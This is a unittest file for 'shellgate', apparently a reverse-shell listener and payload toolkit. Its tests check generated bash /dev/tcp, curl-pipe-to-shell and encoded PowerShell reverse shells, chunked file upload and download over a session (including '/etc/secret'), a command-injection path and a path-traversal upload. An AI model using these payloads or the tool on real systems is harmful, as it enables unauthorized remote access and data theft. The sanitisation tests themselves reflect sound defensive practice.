from __future__ import annotations

import base64
import hashlib
import os
import socket
import tempfile
import threading
import time
import unittest
import urllib.request

from shellgate.cli import build_parser
from shellgate.listener import SessionManager
from shellgate.payloads import generate_payloads
from shellgate.staging import StagingServer
from shellgate.transfer import download_file, quote_ps_single, upload_file, validate_win_cmd_path
from shellgate.tunnel import TunnelManager, detect_local_ip, strip_ansi


def _start_mock_posix_agent(port: int, files_on_target: dict[str, bytes]) -> threading.Thread:
    """Simulate a remote POSIX shell answering fingerprint, upload, and download probes."""

    def _run() -> None:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("127.0.0.1", port))
        b64_buf: dict[str, bytearray] = {}
        try:
            buf = ""
            while True:
                data = s.recv(4096)
                if not data:
                    break
                buf += data.decode(errors="ignore")
                while "\n" in buf:
                    line, buf = buf.split("\n", 1)
                    if "uname -s" in line:
                        s.sendall(b"Linux\n")
                    elif "ID_S__" in line:
                        s.sendall(b"__PH_ID_S__\nz0ke\ntarget-box\n__PH_ID_E__\n")
                    elif line.startswith("rm -f "):
                        continue
                    elif line.startswith("printf '%s' '"):
                        chunk = line.split("printf '%s' '", 1)[1].split("' >> ", 1)[0]
                        target_b64 = line.split("' >> ", 1)[1].strip()
                        b64_buf.setdefault(target_b64, bytearray()).extend(chunk.encode())
                    elif line.startswith("base64 -d "):
                        b64_path = line.split("base64 -d ", 1)[1].split(" > ", 1)[0].strip()
                        raw_bytes = base64.b64decode(bytes(b64_buf.get(b64_path, b"")))
                        sha = hashlib.sha256(raw_bytes).hexdigest()
                        files_on_target["uploaded"] = raw_bytes
                        s.sendall(f"__PH_UP_S__\n{sha}  /tmp/out.bin\n__PH_UP_E__\n".encode())
                    elif "START_''B64" in line:
                        content = files_on_target["sample"]
                        b64 = base64.b64encode(content).decode()
                        s.sendall(f"---START_B64---\n{b64}\n---END_B64---\n".encode())
        finally:
            s.close()

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    return t


class ShellGateTests(unittest.TestCase):
    def test_strip_ansi_and_cli_parser(self) -> None:
        self.assertEqual(strip_ansi("\x1b[92mtcp://a:123\x1b[0m"), "tcp://a:123")
        defaults = build_parser().parse_args([])
        self.assertEqual(defaults.port, 8888)
        self.assertEqual(defaults.mode, "local")
        self.assertEqual(defaults.iface, "tun0")
        self.assertFalse(defaults.yolo)
        args = build_parser().parse_args(["--port", "9001", "--mode", "local", "--host", "10.10.14.5", "-y"])
        self.assertEqual(args.port, 9001)
        self.assertEqual(args.mode, "local")
        self.assertEqual(args.host, "10.10.14.5")
        self.assertTrue(args.yolo)
        ip = detect_local_ip("nonexistent_iface0")
        self.assertRegex(ip, r"^\d+\.\d+\.\d+\.\d+$")

    def test_tunnel_local_mode(self) -> None:
        t = TunnelManager(local_port=9999, mode="local", host_override="10.10.14.8")
        t.start()
        self.assertEqual(t.url, "tcp://10.10.14.8:9999")
        t.stop()

    def test_payload_generation_and_powershell_encoding(self) -> None:
        p = generate_payloads("10.10.14.2", 4444, http_url="http://10.10.14.2:8080")
        self.assertIn("/dev/tcp/10.10.14.2/4444", p["bash_tcp"])
        self.assertIn("curl -fsSL http://10.10.14.2:8080/rev.sh | sh", p["curl_exec"])
        b64_part = p["powershell_b64"].split("-EncodedCommand ", 1)[1]
        decoded = base64.b64decode(b64_part).decode("utf-16le")
        self.assertIn("TCPClient('10.10.14.2',4444)", decoded)

    def test_quoting_and_path_validation(self) -> None:
        self.assertEqual(quote_ps_single("C:\\Users\\o'neil\\a.txt"), "'C:\\Users\\o''neil\\a.txt'")
        with self.assertRaises(ValueError):
            validate_win_cmd_path("C:\\temp\\bad.txt & whoami")

    def test_session_fingerprint_upload_download_sha256(self) -> None:
        connected = threading.Event()
        mgr = SessionManager(bind_host="127.0.0.1", port=0, on_connect=lambda _s: connected.set())
        mgr.start()
        try:
            payload_bytes = os.urandom(2500) + b"\x00\xffEND"
            target_files = {"sample": b"secret_flag{shellgate_v2_verified}"}
            _start_mock_posix_agent(mgr.actual_port, target_files)

            self.assertTrue(connected.wait(timeout=5.0))
            sessions = mgr.list_sessions()
            self.assertEqual(len(sessions), 1)
            sess = sessions[0]
            self.assertEqual(sess.os, "linux")
            self.assertEqual(sess.user, "z0ke")
            self.assertEqual(sess.host, "target-box")

            with tempfile.TemporaryDirectory() as tmpdir:
                local_in = os.path.join(tmpdir, "payload.bin")
                local_out = os.path.join(tmpdir, "downloaded.bin")
                with open(local_in, "wb") as fh:
                    fh.write(payload_bytes)

                ok_up, msg_up = upload_file(sess, local_in, "/tmp/my tool.bin", chunk_size=500)
                self.assertTrue(ok_up, msg_up)
                self.assertEqual(target_files["uploaded"], payload_bytes)
                self.assertIn("SHA-256 verified", msg_up)

                ok_dl, msg_dl = download_file(sess, "/etc/secret", local_out)
                self.assertTrue(ok_dl, msg_dl)
                with open(local_out, "rb") as fh:
                    self.assertEqual(fh.read(), target_files["sample"])
        finally:
            mgr.stop()

    def test_staging_server_get_and_safe_post_upload(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            with open(os.path.join(tmpdir, "hello.txt"), "wb") as fh:
                fh.write(b"shellgate-stage")
            srv = StagingServer(directory=tmpdir, bind_host="127.0.0.1", port=0)
            port = srv.start()
            try:
                with urllib.request.urlopen(f"http://127.0.0.1:{port}/hello.txt") as resp:
                    self.assertEqual(resp.read(), b"shellgate-stage")

                boundary = "----ShellGateBoundary"
                body = (
                    f"--{boundary}\r\n"
                    'Content-Disposition: form-data; name="file"; filename="../../evil.txt"\r\n'
                    "Content-Type: application/octet-stream\r\n\r\n"
                    "loot-data\r\n"
                    f"--{boundary}--\r\n"
                ).encode()
                req = urllib.request.Request(
                    f"http://127.0.0.1:{port}/upload",
                    data=body,
                    headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
                    method="POST",
                )
                with urllib.request.urlopen(req) as resp:
                    self.assertEqual(resp.status, 200)

                safe_saved = os.path.join(tmpdir, "uploads", "evil.txt")
                self.assertTrue(os.path.isfile(safe_saved))
                with open(safe_saved, "rb") as fh:
                    self.assertEqual(fh.read(), b"loot-data")
                self.assertFalse(os.path.exists(os.path.join(tmpdir, "evil.txt")))
            finally:
                srv.stop()


if __name__ == "__main__":
    unittest.main()
